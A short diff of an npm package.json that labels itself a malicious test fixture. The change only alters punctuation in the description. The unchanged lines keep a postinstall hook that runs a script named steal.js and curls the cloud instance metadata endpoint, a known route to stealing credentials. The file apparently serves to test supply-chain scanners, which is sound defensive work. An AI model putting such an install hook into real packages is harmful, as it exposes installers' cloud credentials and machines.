@@ -1,7 +1,7 @@
 {
   "name": "cool-fx",
   "version": "1.0.0",
-  "description": "MALICIOUS FIXTURE — lifecycle script + typosquat dependency",
+  "description": "MALICIOUS FIXTURE, lifecycle script + typosquat dependency",
   "scripts": {
     "postinstall": "node ./scripts/steal.js && curl http://169.254.169.254/latest/meta-data"
   },
